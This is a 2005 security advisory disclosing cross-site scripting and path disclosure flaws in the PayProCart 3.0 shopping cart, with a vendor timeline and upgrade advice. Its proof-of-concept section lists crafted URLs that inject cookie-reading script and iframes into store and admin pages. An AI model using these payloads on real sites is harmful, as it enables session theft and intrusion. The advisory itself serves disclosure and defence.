 ###################################################
PayProCart multiple variable XSS & path disclosure
vendor:http://www.profitcode.net/products/payprocart.html
vendor confirmed: yes exploit avaible: yes
advisore:http://lostmon.blogspot.com/2005/04/
payprocart-multiple-variable-xss-path.html
OSVDB IDS:15528,15529,15530,15531,15532,15533,
15534,15535,15536,15537,15538
##################################################

found in a internal test wen documented latest vulnerabilities in
Profitcode PayProCart 3.0

PayProCart contains a flaw that allows a remote cross site scripting
attack.This flaw exists because the application does not validate
'username','chckoutaction','ckprvd' and 'pageID' upon submission
to the 'cart.php' and 'index.php' script.This could allow a user to create
a specially crafted URL that would execute arbitrary code in a user's
browser within the trust relationship between the browser and the
server,leading to a loss of integrity.

Also in adminshop secction we found some flaws in 'hdoc','modID',
'taskID','proMod' variables, upon submission to the
'adminshop/index.php' script , 'mmactionComm' variable,upon
submission to the 'mmailer/index.php' script but it can only
exploiting for a autenticated admin.

Other scripts can be vulnerables to same attack style.

#########
versions
#########

3.0 vulnerable.
3.1 not tested

#############
solution:
#############

Upgrade to version 3.1 or higher, as it has been reported to fix this
vulnerability. An upgrade is required as there are no known workarounds.

some code features are change in PayProCart 3.1 and most bug fixes
the vendor´s continue working whith all of these flaws.

download update url: http://www.profitcode.net/products/payprocart-31.html

##########
timeline
##########

discovered: 6 april 2005
vendor notify: 7 april 2005
vendor respose:7 april 2005
disclosure: 15 april 2005
public disclosure: 20 april 2005


################
proof of concepts.
################
################################
index.php Multiple Variable XSS
################################

http://[target]/path_to_store/index.php?modID=uauthcfrm&cnfType=
muec"><script>alert(document.cookie)</script>
//need client login

http://[target]/path_to_store/index.php?modID=usrauthlogin&sgnuptype=
csaleID&username=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script
%3E&errorMsgNum=301

http://[target]/path_to_store/index.php?modID=usrauthlogin[XSS-code]



############################
cart.php ckprvd Variable XSS
############################

http://[target]/path_to_store/cart.php?chckoutaction=1&ckprvd=
%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

##########################################
adminshop/index.php Multiple Variable XSS
##########################################

http://[target]/path_to_store/adminshop/index.php?hdoc=index
%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://[victim]/path_to-store/adminshop/index.php?taskID=
%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://[target]/path_to_store/adminshop/index.php?proMod=
%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://[target]/path_to_store/adminshop/index.php?modID=
%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

###########################################################
adminshop/mmailer/index.php mmactionComm Variable XSS
###########################################################

http://[target]/path_to_store/adminshop/mmailer/index.php?mmactionComm=
mmShowMailingLists%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

############################################
tplates/usrauthlogin.php username field XSS
############################################

http://[target]/path_to_store/index.php?modID=usrauthlogin&sgnuptype=
csaleID&username=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script
%3E&errorMsgNum=301

########################################
Template function.main Path Disclosure
########################################

/tplates/csaleID.php
/tplates/emailconfirm.php
/tplates/grpcom.php
/tplates/help.php
/tplates/uauthcfrm.php
/tplates/usrcarts.php
/tplates/wsaleID.php

################################################
mailingsignup.php Direct Request Path Disclosure
################################################

/tplates/mailingsignup.php

###############################################
newitems.php Direct Request Path Disclosure
###############################################

/tplates/newitems.php

############################################
specials.php Direct Request Path Disclosure
############################################

/tplates/specials.php

########################################
/tplates/usrauthstamp.php IP Disclosure
########################################

http://[victim]/payprocart/index.php?modID=usrauthlogin&sgnuptype=
csaleID&username=%22%3E%3Ciframe%20src=http://[victim]/payprocart
/tplates/usrauthstamp.php%3E%3Ciframe%3E&errorMsgNum=301

(concern, used in conjunction with XSS)

#######################################################
mainincs/checkout_totaltrans.php Information Disclosure
#######################################################

http://[victim]/payprocart/index.php?modID=usrauthlogin&sgnuptype=
csaleID&username=%22%3E%3Ciframe%20src=http://[victim]/payprocart
/mainincs/checkout_totaltrans.php%3E%3Ciframe%3E&errorMsgNum=301

(concern, used in conjunction with XSS)

############################################
aff/index.php multiple variable XSS
############################################

http://[target]/path_to_store/aff/index.php?pageID=agreementENG
%22%3E%3h1%3Elalalal%3C/h1%3E
//need client login

http://[target]/path_to_store/aff/index.php?modID=clicks_graph
%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
// nedd client login.

####### end #######

thnx to estrella to be my ligth
thnx to johnyd of PayProCart, very good vendor, he can be sure that if
needs to test something,one make this with taste:D
thnx to all http://www.osvdb.org Team
thnx to JxT and jericho for the support
--
atentamente:
Lostmon (lostmon@gmail.com)
Web-Blog: http://lostmon.blogspot.com/
Data Mangle of: http://www.osvdb.org
--
La curiosidad es lo que hace mover la mente....
